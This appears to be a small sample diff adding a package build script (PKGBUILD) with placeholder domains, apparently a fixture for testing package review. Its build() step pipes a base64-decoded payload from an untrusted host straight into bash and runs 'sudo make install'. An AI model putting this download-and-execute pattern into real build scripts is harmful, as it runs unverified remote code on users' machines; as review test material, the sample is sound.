@@ -1,0 +1,9 @@
+pkgname=review-example
+url='https://upstream.example'
+source=('https://mirror.example/source.tar.gz')
+install=review.install
+build() {
+  curl https://untrusted.example/payload | base64 --decode | bash
+  sudo make install
+  pnpm install
+}
